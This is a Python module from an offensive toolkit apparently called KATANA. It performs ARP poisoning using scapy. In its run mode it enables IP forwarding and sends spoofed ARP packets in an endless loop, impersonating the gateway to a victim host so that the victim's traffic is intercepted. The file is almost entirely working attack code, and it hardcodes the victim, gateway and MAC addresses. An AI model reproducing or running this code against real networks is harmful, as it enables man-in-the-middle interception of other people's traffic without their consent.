# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# @KATANA                       #
# Modules   : ARP Poisoning     #
# Script by : RedToor           #
# Date      : 26/08/2015        #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                   #
from core.design import *       #
from core.Setting import *      #
from core import Errors         #
from core import help           #
from core import ping           #
import sys                      #
d=DESIGN()                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                     #
from scapy.all import *         #
import threading                #
import sys                      #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Default                       #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
defaultipv=MY_IP
defaultgat=GATEWAY_ADR
defaultint=INTERFACE_DEVICE
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
 
def run(para,parb,parc):
    global defaultgat,defaultipv,defaultint
    defaultipv=para
    defaultgat=parb
    defaultint=parc
    arpp(1)

def arpp(run): 
    try:
        global defaultgat,defaultipv,defaultint
        if run!=1:
            actions=raw_input(d.prompt("net/arpspoof"))
        else:
            actions="run"
        if actions == "show options" or actions == "sop":
            d.option()
            d.descrip("target","yes","IP victim",defaultipv)
            d.descrip("gway","yes","Gateway-Router.",defaultgat)
            d.descrip("inter","yes","Interface",defaultint)
            d.helpAUX()
            if ping.conneted()!=False:
                ping.interfaces(1)
                ping.get_gateway(1)
                ping.my_mac_address(1)
                d.space()
                ping.lan_ips(1)
            else:
                print d.noconnect()
            print ""
            arpp(0)
        elif actions[0:10] == "set target":
            defaultipv = actions[11:]
            d.change("target",defaultipv)
            arpp(0)
        elif actions[0:8] == "set gway":
            defaultgat = actions[9:]
            d.change("gway",defaultgat)
            arpp(0)
        elif actions[0:10] == "set inter":
            defaultint = actions[11:]
            d.change("inter",defaultint)
            arpp(0)
        elif actions=="exit" or actions=="x":
            d.goodbye()
            exit()
        elif actions=="help" or actions=="h":
            help.help()
        elif actions=="back" or actions=="b":
            return
            return
        elif actions=="run"  or actions=="r":
            d.run()
            try:
                print " "+Alr+" Ensure the victim recieves packets by forwarding them"
                ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
                op=1                    # Op code 1 for ARP requests
                victim="192.168.1.210"  # Replace with Victims IP
                spoof='192.168.1.254'   # Replace with Gateways IP
                mac='10:FE:ED:1D:CB:CC' # Replace with Attackers Phys. Addr.
                arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
                while 1:
                    print " "+Alr+" Send ARP's packets, Now ",send(arp)
                    #time.sleep(2)
            except:
                Errors.Errors(event=sys.exc_info()[0], info=False)
        else:
            d.No_actions()
    except:
        Errors.Errors(event=sys.exc_info()[0], info=False)
    arpp(0)